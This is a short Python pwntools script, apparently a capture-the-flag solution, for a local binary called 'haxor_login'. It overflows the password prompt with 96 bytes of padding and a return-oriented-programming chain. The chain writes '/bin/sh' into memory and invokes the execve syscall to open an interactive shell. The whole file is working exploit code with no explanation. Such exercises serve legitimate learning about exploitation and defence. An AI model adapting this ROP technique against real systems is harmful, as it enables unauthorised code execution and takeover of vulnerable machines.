from pwn import *
r = process("./haxor_login")
def main():
    offset = 96
    bss = 0x080ebf80
    pop_eax = 0x080b93c6
    pop_ecx_ebx = 0x0806fda1
    pop_edx = 0x0806fd7a
    mov_eax_edx = 0x0805577b
    interupt = 0x08070340
    syscall = 11


    p = "A" * 96
    p += p32(pop_edx)
    p += p32(bss)
    p += p32(pop_eax)
    p += "/bin"
    p += p32(mov_eax_edx)

    p += p32(pop_edx)
    p += p32(bss+4)
    p += p32(pop_eax)
    p += "/sh\x00"
    p += p32(mov_eax_edx)

    p += p32(pop_eax)
    p += p32(syscall)
    p += p32(pop_edx)
    p += p32(0)
    p += p32(pop_ecx_ebx)
    p += p32(0)
    p += p32(bss)
    p += p32(interupt)

    r.sendlineafter("[?] Username : ","a")
    r.sendlineafter("[?] Password for a : ",p)
    r.interactive()



if __name__ == '__main__':
    main()
